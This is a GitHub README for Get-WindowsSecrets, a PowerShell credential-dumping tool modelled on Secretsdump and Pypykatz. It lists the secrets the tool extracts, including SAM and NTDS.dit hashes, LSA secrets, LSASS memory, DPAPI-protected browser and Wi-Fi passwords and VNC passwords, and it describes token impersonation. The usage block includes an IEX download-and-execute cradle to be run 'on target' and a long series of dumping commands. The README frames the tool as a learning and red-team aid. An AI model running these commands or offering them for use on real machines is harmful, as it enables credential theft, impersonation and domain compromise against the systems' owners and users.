# MindMap

[MindMap](<https://github.com/YRazafim/Get-WindowsSecrets/blob/main/Windows Secrets.pdf>) with pseudo-code for a high-level overview.

# Why

To understand how to dump Windows Secrets internally.<br/>
Powershell implementation of [Secretsdump](<https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py>) and [Pypykatz](<https://github.com/skelsec/pypykatz>).<br/>
The script work (or should work!) on a local Windows machine:
  * Powershell v2 to latest
  * Windows NT 6.0 to latest

It is not intended to bypass AVs/EDRs and you have to be administrator on the computer.<br/>
The code is commented to understand each process.

Currently It can:<br/>
   * Dump BootKey
   * Compute Hashed BootKey
   * Dump SAM
   * Dump LSA Secrets
      *	$MACHINE.ACC = Machine account password in clear text if computer is joined to a domain<br/>
      * DefaultPassword = Clear text password when autologon is configured for an account<br/>
      * NL$KM = Secret key in clear text for decrypting Cached Domain Credentials<br/>
      * DPAPI_SYSTEM = System User PreKey and System Machine PreKey in clear text for decrypting System User MasterKey files and System Machine MasterKey files (DPAPI)<br/>
      * \_SC\_&lt;ServiceName&gt; = Account password for Windows Services (not Scheduled Tasks) in clear text<br/>
      * ASPNET_WP_PASSWORD = Password for .NET services in clear text<br/>
      * L$_SQSA_S-&lt;SID&gt; = Clear text answers for Windows Security Questions
   * Dump Cached Domain Credentials
   * Dump DPAPI Secrets<br/>
      * Wi-Fi passwords<br/>
      * Chrome cookies/passwords<br/>
      * Vault Credential Manager passwords (VPOL and VCRD files)
   * Dump VNC passwords (RealVNC, TightVNC, TigerVNC, UltraVNC)
   * Dump NTDS.dit (Shadow Copy and parsing as ESE format)
      * LM and NT Hashes
      * Domain Backup Keys
   * Dump LSASS (ProcOpen and DupHandle methods)
   * List Session Tokens and Impersonate (ImpersonateLoggedOnUser()/CreateProcessWithToken()/CreateProcessAsUser())

# How it works

Download the script on target and from Powershell:
```
IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/YRazafim/Get-WindowsSecrets/main/Get-WindowsSecrets.ps1")
. <Path>\Get-WindowsSecrets.ps1;
Get-WindowsSecrets -SAM
Get-WindowsSecrets -LSA
Get-WindowsSecrets -CachedDomainCreds
Get-WindowsSecrets -VNC
Get-WindowsSecrets -NTDS
Get-WindowsSecrets -NTDS -ExportDomainBackupKey
Get-WindowsSecrets -SessionTokens
Get-WindowsSecrets -SessionTokens -FilterUser "Administrator"
Get-WindowsSecrets -ActivatePrivilege "SeShutdownPrivilege"
Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "ImpersonateLoggedOnUser"
Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessWithToken"
Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser"
Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod "CreateProcessAsUser" -Command "whoami"
Get-WindowsSecrets -LSASS
Get-WindowsSecrets -DPAPI [-SkipLSASS] [-SkipNTDS]
Get-WindowsSecrets -DPAPI -ImportDomainBackupKey <HexStringDomainBackupKeyPVKFormat> -SkipNTDS
Get-WindowsSecrets -DPAPI -InUserContext -NoMasterKeysDecryption -SkipLSA -SkipLSASS -SkipNTDS
Get-WindowsSecrets -DPAPI -Creds 'User1:Pwd1/User2@Domain:Pwd2' -NTHashes 'User1:HexNTHash1/User2@Domain:HexNTHash2'
```

Creds and NTHashes parameters helped for DPAPI only (If you compromised these secrets for a user).
